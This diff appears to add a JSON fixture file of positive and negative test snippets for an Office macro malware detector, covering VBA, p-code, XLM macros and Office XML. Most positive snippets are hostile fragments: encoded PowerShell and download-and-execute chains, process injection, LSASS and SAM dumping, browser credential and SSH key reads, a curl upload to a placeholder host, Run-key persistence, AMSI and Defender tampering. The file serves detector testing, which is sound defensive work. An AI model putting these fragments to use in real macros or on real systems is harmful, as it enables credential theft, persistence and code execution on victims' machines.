@@ -1,0 +1,491 @@
+{
+  "OFM-VBA-0101": {
+    "artifact": "vba",
+    "positive": "Private Sub Workbook_Open()",
+    "negative": "MsgBox \"Workbook_Open\""
+  },
+  "OFM-VBA-0102": {
+    "artifact": "vba",
+    "positive": "Private Sub Workbook_BeforeClose(Cancel As Boolean)",
+    "negative": null
+  },
+  "OFM-VBA-0103": {
+    "artifact": "vba",
+    "positive": "Application.OnTime nextTick, \"Refresh\"",
+    "negative": null
+  },
+  "OFM-VBA-0104": {
+    "artifact": "vba",
+    "positive": "Private Sub App_PresentationOpen(ByVal Pres As Presentation)",
+    "negative": null
+  },
+  "OFM-VBA-0201": {
+    "artifact": "vba",
+    "positive": "Shell \"powershell.exe -EncodedCommand QUFBQUFBQUE=\"",
+    "negative": "Shell \"powershell.exe -NoProfile\""
+  },
+  "OFM-VBA-0202": {
+    "artifact": "vba",
+    "positive": "powershell.exe Invoke-Expression (Invoke-WebRequest $uri)",
+    "negative": "powershell.exe Invoke-WebRequest $uri"
+  },
+  "OFM-VBA-0203": {
+    "artifact": "vba",
+    "positive": "Shell \"cmd.exe /c echo fixture\"",
+    "negative": "MsgBox \"cmd.exe /c echo fixture\""
+  },
+  "OFM-VBA-0204": {
+    "artifact": "vba",
+    "positive": "Shell \"cscript.exe fixture.vbs\"",
+    "negative": null
+  },
+  "OFM-VBA-0205": {
+    "artifact": "vba",
+    "positive": "Shell \"mshta.exe https://example.invalid/fixture.hta\"",
+    "negative": null
+  },
+  "OFM-VBA-0206": {
+    "artifact": "vba",
+    "positive": "Shell \"regsvr32.exe /i:fixture.sct scrobj.dll\"",
+    "negative": null
+  },
+  "OFM-VBA-0207": {
+    "artifact": "vba",
+    "positive": "Shell \"rundll32.exe %TEMP%\\fixture.dll,Entry\"",
+    "negative": null
+  },
+  "OFM-VBA-0301": {
+    "artifact": "vba",
+    "positive": "pid = Shell(\"notepad.exe\", vbNormalFocus)",
+    "negative": "Set obj = CreateObject(\"WScript.Shell\")"
+  },
+  "OFM-VBA-0302": {
+    "artifact": "vba",
+    "positive": "Set sh = CreateObject(\"WScript.Shell\")\nsh.Run \"notepad.exe\"",
+    "negative": null
+  },
+  "OFM-VBA-0303": {
+    "artifact": "vba",
+    "positive": "Private Declare PtrSafe Function Launch Lib \"kernel32\" Alias \"CreateProcessW\" () As Long",
+    "negative": "MsgBox \"CreateProcessW\""
+  },
+  "OFM-VBA-0304": {
+    "artifact": "vba",
+    "positive": "Set w = GetObject(\"winmgmts:\")\nSet p = w.Get(\"Win32_Process\")\np.Create \"notepad.exe\"",
+    "negative": "Set p = GetObject(\"winmgmts:\").Get(\"Win32_Process\")"
+  },
+  "OFM-VBA-0305": {
+    "artifact": "vba",
+    "positive": "Set sh = CreateObject(\"Shell.Application\")\nsh.ShellExecute \"notepad.exe\"",
+    "negative": null
+  },
+  "OFM-VBA-0401": {
+    "artifact": "vba",
+    "positive": "OpenProcess\nWriteProcessMemory\nCreateRemoteThread",
+    "negative": "OpenProcess\nVirtualAllocEx"
+  },
+  "OFM-VBA-0402": {
+    "artifact": "vba",
+    "positive": "VirtualAllocEx\nWriteProcessMemory\nQueueUserAPC",
+    "negative": null
+  },
+  "OFM-VBA-0403": {
+    "artifact": "vba",
+    "positive": "VirtualAlloc\nRtlMoveMemory\nCreateThread",
+    "negative": "VirtualAlloc\nRtlMoveMemory"
+  },
+  "OFM-VBA-0404": {
+    "artifact": "vba",
+    "positive": "LoadLibraryW\nGetProcAddress",
+    "negative": null
+  },
+  "OFM-VBA-0405": {
+    "artifact": "vba",
+    "positive": "CreateProcessW\nCREATE_SUSPENDED\nNtUnmapViewOfSection\nResumeThread",
+    "negative": null
+  },
+  "OFM-VBA-0501": {
+    "artifact": "vba",
+    "positive": "Private Declare PtrSafe Function CredReadW Lib \"advapi32.dll\" () As Long",
+    "negative": null
+  },
+  "OFM-VBA-0502": {
+    "artifact": "vba",
+    "positive": "CryptUnprotectData\nChrome\\User Data\\Default\\Login Data",
+    "negative": "CryptUnprotectData\nConfigurationBlob"
+  },
+  "OFM-VBA-0503": {
+    "artifact": "vba",
+    "positive": "lsass.exe\nOpenProcess\nMiniDumpWriteDump",
+    "negative": null
+  },
+  "OFM-VBA-0504": {
+    "artifact": "vba",
+    "positive": "Shell \"reg.exe save HKLM\\SAM fixture.bin\"",
+    "negative": null
+  },
+  "OFM-VBA-0505": {
+    "artifact": "vba",
+    "positive": "fs.OpenTextFile(userPath & \"\\.aws\\credentials\")",
+    "negative": null
+  },
+  "OFM-VBA-0506": {
+    "artifact": "vba",
+    "positive": "s = InputBox(\"Enter password\")\nreq = \"MSXML2.XMLHTTP\"\nreq.Send s",
+    "negative": null
+  },
+  "OFM-VBA-0601": {
+    "artifact": "vba",
+    "positive": "x = Chr(80) & Chr(79) & Chr(87) & Chr(69) & Chr(82) & Chr(83)",
+    "negative": null
+  },
+  "OFM-VBA-0602": {
+    "artifact": "vba",
+    "positive": "node.DataType = \"bin.base64\"\nbytes = node.NodeTypedValue",
+    "negative": null
+  },
+  "OFM-VBA-0603": {
+    "artifact": "vba",
+    "positive": "x = StrReverse(Replace(value, \"X\", \"\"))",
+    "negative": null
+  },
+  "OFM-VBA-0604": {
+    "artifact": "vba",
+    "positive": "Win32_ComputerSystem\nVirtualBox",
+    "negative": "MsgBox \"VirtualBox\""
+  },
+  "OFM-VBA-0605": {
+    "artifact": "vba",
+    "positive": "Sleep 5000\nShell \"notepad.exe\"",
+    "negative": null
+  },
+  "OFM-VBA-0606": {
+    "artifact": "vba",
+    "positive": "Shell \"notepad.exe\", vbHide",
+    "negative": null
+  },
+  "OFM-VBA-0607": {
+    "artifact": "vba",
+    "positive": "SetAttr path, vbHidden Or vbSystem",
+    "negative": null
+  },
+  "OFM-VBA-0701": {
+    "artifact": "vba",
+    "positive": "Set f = fs.CreateTextFile(Environ(\"TEMP\") & \"\\fixture.vbs\")",
+    "negative": "Set f = fs.CreateTextFile(Environ(\"TEMP\") & \"\\report.txt\")"
+  },
+  "OFM-VBA-0702": {
+    "artifact": "vba",
+    "positive": "Set s = CreateObject(\"ADODB.Stream\")\ns.Type = 1\ns.SaveToFile path",
+    "negative": null
+  },
+  "OFM-VBA-0703": {
+    "artifact": "vba",
+    "positive": "fs.DeleteFile tempFile",
+    "negative": null
+  },
+  "OFM-VBA-0704": {
+    "artifact": "vba",
+    "positive": "Shell \"7z.exe a fixture.zip C:\\Reports\"",
+    "negative": null
+  },
+  "OFM-VBA-0801": {
+    "artifact": "vba",
+    "positive": "Set r = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\nr.Open \"GET\", u\nr.Send",
+    "negative": null
+  },
+  "OFM-VBA-0802": {
+    "artifact": "vba",
+    "positive": "Declare PtrSafe Function URLDownloadToFileW Lib \"urlmon.dll\" () As Long",
+    "negative": null
+  },
+  "OFM-VBA-0803": {
+    "artifact": "vba",
+    "positive": "InternetOpenW\nInternetReadFile",
+    "negative": null
+  },
+  "OFM-VBA-0804": {
+    "artifact": "vba",
+    "positive": "Shell \"nslookup example.invalid\"",
+    "negative": null
+  },
+  "OFM-VBA-0805": {
+    "artifact": "vba",
+    "positive": "fs.CopyFile \"\\\\example.invalid@SSL\\DavWWWRoot\\fixture.txt\", dest",
+    "negative": null
+  },
+  "OFM-VBA-0901": {
+    "artifact": "vba",
+    "positive": "url = \"http://192.0.2.1/fixture\"",
+    "negative": "url = \"http://192.0.2.1.example.invalid/fixture\""
+  },
+  "OFM-VBA-0902": {
+    "artifact": "vba",
+    "positive": "XMLHTTP\nhttps://bit.ly/fixture",
+    "negative": null
+  },
+  "OFM-VBA-0903": {
+    "artifact": "vba",
+    "positive": "XMLHTTP\nu = \"htt\" & \"ps://example.invalid/\"",
+    "negative": null
+  },
+  "OFM-VBA-1001": {
+    "artifact": "vba",
+    "positive": "XMLHTTP\ns.LoadFromFile path\nr.Open \"POST\", endpoint\nr.Send payload",
+    "negative": "XMLHTTP\nr.Open \"POST\", endpoint\nr.Send payload"
+  },
+  "OFM-VBA-1002": {
+    "artifact": "vba",
+    "positive": "Outlook.Application\nSet m = app.CreateItem(0)\nm.Attachments.Add path\nm.Send",
+    "negative": "Outlook.Application\nSet m = app.CreateItem(0)\nm.Attachments.Add path\nm.Display"
+  },
+  "OFM-VBA-1003": {
+    "artifact": "vba",
+    "positive": "WinHttpRequest\nhttps://hooks.slack.com/services/FIXTURE\nr.Send body",
+    "negative": null
+  },
+  "OFM-VBA-1101": {
+    "artifact": "vba",
+    "positive": "ThisWorkbook.SaveCopyAs Application.StartupPath & \"\\fixture.xlsm\"",
+    "negative": null
+  },
+  "OFM-VBA-1102": {
+    "artifact": "vba",
+    "positive": "ActiveWorkbook.VBProject.VBComponents.Import modulePath",
+    "negative": null
+  },
+  "OFM-VBA-1103": {
+    "artifact": "vba",
+    "positive": "p = sh.SpecialFolders(\"Startup\")\nsh.CreateShortcut p",
+    "negative": null
+  },
+  "OFM-VBA-1104": {
+    "artifact": "vba",
+    "positive": "Shell \"schtasks.exe /create /tn fixture\"",
+    "negative": "Shell \"schtasks.exe /query\""
+  },
+  "OFM-VBA-1105": {
+    "artifact": "vba",
+    "positive": "Shell \"sc.exe create FixtureService\"",
+    "negative": null
+  },
+  "OFM-VBA-1201": {
+    "artifact": "vba",
+    "positive": "sh.RegWrite \"HKCU\\Software\\Fixture\\Value\", 1",
+    "negative": "value = sh.RegRead(\"HKCU\\Software\\Fixture\")"
+  },
+  "OFM-VBA-1202": {
+    "artifact": "vba",
+    "positive": "sh.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Fixture\", path",
+    "negative": null
+  },
+  "OFM-VBA-1203": {
+    "artifact": "vba",
+    "positive": "sh.RegWrite \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\fixture.exe\\Debugger\", path",
+    "negative": null
+  },
+  "OFM-VBA-1301": {
+    "artifact": "vba",
+    "positive": "sh.RegWrite \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings\", 1",
+    "negative": null
+  },
+  "OFM-VBA-1302": {
+    "artifact": "vba",
+    "positive": "Set-MpPreference -DisableRealtimeMonitoring $value",
+    "negative": "Get-MpPreference -ExclusionPath"
+  },
+  "OFM-VBA-1303": {
+    "artifact": "vba",
+    "positive": "AmsiScanBuffer\nVirtualProtect",
+    "negative": "AmsiScanBuffer\nGetProcAddress"
+  },
+  "OFM-VBA-1304": {
+    "artifact": "vba",
+    "positive": "wevtutil.exe cl FixtureLog",
+    "negative": "wevtutil.exe qe FixtureLog"
+  },
+  "OFM-VBA-1401": {
+    "artifact": "vba",
+    "positive": "Set svc = GetObject(\"winmgmts:\")\nsvc.ExecQuery \"SELECT * FROM Win32_OperatingSystem\"",
+    "negative": null
+  },
+  "OFM-VBA-1402": {
+    "artifact": "vba",
+    "positive": "Shell \"cmd.exe /c whoami & ipconfig\"",
+    "negative": null
+  },
+  "OFM-VBA-1501": {
+    "artifact": "vba",
+    "positive": "MSForms.DataObject\ndata.GetFromClipboard\ns = data.GetText",
+    "negative": null
+  },
+  "OFM-VBA-1502": {
+    "artifact": "vba",
+    "positive": "For k = 1 To 255\n x = GetAsyncKeyState(k)\nNext",
+    "negative": null
+  },
+  "OFM-VBA-1503": {
+    "artifact": "vba",
+    "positive": "GetDesktopWindow\nBitBlt\nGetDIBits",
+    "negative": null
+  },
+  "OFM-VBA-1601": {
+    "artifact": "vba",
+    "positive": "XMLHTTP\ns.Write r.ResponseBody\ns.SaveToFile p\nShell p",
+    "negative": "XMLHTTP\ns.Write r.ResponseBody\ns.SaveToFile p"
+  },
+  "OFM-VBA-1602": {
+    "artifact": "vba",
+    "positive": "URLDownloadToFileW\nsh.Run path",
+    "negative": null
+  },
+  "OFM-VBA-1603": {
+    "artifact": "vba",
+    "positive": "Sub Auto_Open()\nShell \"cmd.exe /c echo fixture\"\nEnd Sub",
+    "negative": "Sub Auto_Open()\nMsgBox \"cmd.exe\"\nEnd Sub"
+  },
+  "OFM-VBA-1604": {
+    "artifact": "vba",
+    "positive": "CryptStringToBinaryW\ns.SaveToFile p\nShell p",
+    "negative": null
+  },
+  "OFM-VBA-1701": {
+    "artifact": "vba",
+    "positive": "x = MacScript(\"do shell script \"\"echo fixture\"\"\")",
+    "negative": null
+  },
+  "OFM-VBA-1702": {
+    "artifact": "vba",
+    "positive": "MacScript(\"do shell script curl https://example.invalid/fixture\")",
+    "negative": null
+  },
+  "OFM-VBA-1703": {
+    "artifact": "vba",
+    "positive": "MacScript(\"do shell script launchctl bootstrap gui/501 ~/Library/LaunchAgents/fixture.plist\")",
+    "negative": null
+  },
+  "OFM-VBA-1004": {
+    "artifact": "vba",
+    "positive": "Shell \"curl.exe --upload-file fixture.txt https://example.invalid/upload\"",
+    "negative": "Shell \"curl.exe -o fixture.txt https://example.invalid/download\""
+  },
+  "OFM-VBA-0705": {
+    "artifact": "vba",
+    "positive": "fs.OpenTextFile(p & \"\\.ssh\\id_ed25519\")",
+    "negative": null
+  },
+  "OFM-VBA-1204": {
+    "artifact": "vba",
+    "positive": "v = sh.RegRead(\"HKCU\\Software\\Fixture\")",
+    "negative": null
+  },
+  "OFM-VBA-0306": {
+    "artifact": "vba",
+    "positive": "CallByName sh, method, VbMethod, arg\nSet sh = CreateObject(\"WScript.Shell\")",
+    "negative": null
+  },
+  "OFM-PCD-0201": {
+    "artifact": "pcode",
+    "positive": "\tArgsCall (Call) Shell 0x0001",
+    "negative": "\tLitStr 0x0005 \"Shell\""
+  },
+  "OFM-PCD-1601": {
+    "artifact": "pcode",
+    "positive": "LitStr 0x0010 \"MSXML2.XMLHTTP\"\nMemLd ResponseBody\nArgsMemCall SaveToFile 0x0002\nArgsCall (Call) Shell 0x0001",
+    "negative": null
+  },
+  "OFM-PCD-1301": {
+    "artifact": "pcode",
+    "positive": "LitStr 0x000E \"AmsiScanBuffer\"\nLitStr 0x000E \"VirtualProtect\"",
+    "negative": null
+  },
+  "OFM-PCD-0401": {
+    "artifact": "pcode",
+    "positive": "ArgsLd OpenProcess 0x0003\nArgsLd WriteProcessMemory 0x0005\nArgsLd CreateRemoteThread 0x0007",
+    "negative": null
+  },
+  "OFM-PCD-1101": {
+    "artifact": "pcode",
+    "positive": "MemLd VBProject\nMemLd VBComponents\nArgsMemCall (Call) Import 0x0001",
+    "negative": null
+  },
+  "OFM-XLM-0101": {
+    "artifact": "xlm",
+    "positive": "NAME _xlnm.Auto_Open = MacroSheet!A1",
+    "negative": "=\"NAME Auto_Open\""
+  },
+  "OFM-XLM-0201": {
+    "artifact": "xlm",
+    "positive": "=EXEC(\"cmd.exe /c echo fixture\")",
+    "negative": null
+  },
+  "OFM-XLM-0401": {
+    "artifact": "xlm",
+    "positive": "=CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0)",
+    "negative": null
+  },
+  "OFM-XLM-0701": {
+    "artifact": "xlm",
+    "positive": "=FOPEN(\"fixture.txt\",3)\n=FWRITELN(A1,\"fixture\")",
+    "negative": null
+  },
+  "OFM-XLM-0601": {
+    "artifact": "xlm",
+    "positive": "=EXEC(CHAR(65)&CHAR(66)&CHAR(67)&CHAR(68))",
+    "negative": null
+  },
+  "OFM-XLM-1601": {
+    "artifact": "xlm",
+    "positive": "=CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCJJ\",0)\n=EXEC(A2)",
+    "negative": null
+  },
+  "OFM-XML-1901": {
+    "artifact": "office_xml",
+    "positive": "<Relationship TargetMode=\"External\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://example.invalid/fixture.dotm\"/>",
+    "negative": "<Relationship Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"fixture.dotm\"/>"
+  },
+  "OFM-XML-1902": {
+    "artifact": "office_xml",
+    "positive": "<Relationship Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject' Target='https://example.invalid/fixture' TargetMode = 'External'/>",
+    "negative": null
+  },
+  "OFM-XML-1903": {
+    "artifact": "office_xml",
+    "positive": " DDEAUTO cmd.exe \"fixture\" ",
+    "negative": " DDEAUTO Excel \"fixture\" "
+  },
+  "OFM-XML-1904": {
+    "artifact": "office_xml",
+    "positive": "<Relationship Target=\"\\\\example.invalid\\fixture\" TargetMode=\"External\"/>",
+    "negative": null
+  },
+  "OFM-PAY-2001": {
+    "artifact": "payload",
+    "positive": {
+      "hex": "4d5a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000050450000"
+    },
+    "negative": {
+      "hex": "4d5a"
+    }
+  },
+  "OFM-PAY-2002": {
+    "artifact": "payload",
+    "positive": "Set s = CreateObject(\"WScript.Shell\")\ns.Run \"notepad.exe\"",
+    "negative": null
+  },
+  "OFM-EVD-1801": {
+    "artifact": "parser_evidence",
+    "positive": "VBA_STOMPING_SUSPECTED",
+    "negative": "PREFIX VBA_STOMPING_SUSPECTED"
+  },
+  "OFM-EVD-1802": {
+    "artifact": "parser_evidence",
+    "positive": "VBA_PCODE_WITH_EMPTY_SOURCE",
+    "negative": "VBA_PCODE_WITH_EMPTY_SOURCE_EXTRA"
+  },
+  "OFM-EVD-1803": {
+    "artifact": "parser_evidence",
+    "positive": "VBA_ANALYSIS_INCOMPLETE",
+    "negative": "VBA_ANALYSIS_COMPLETE"
+  }
+}
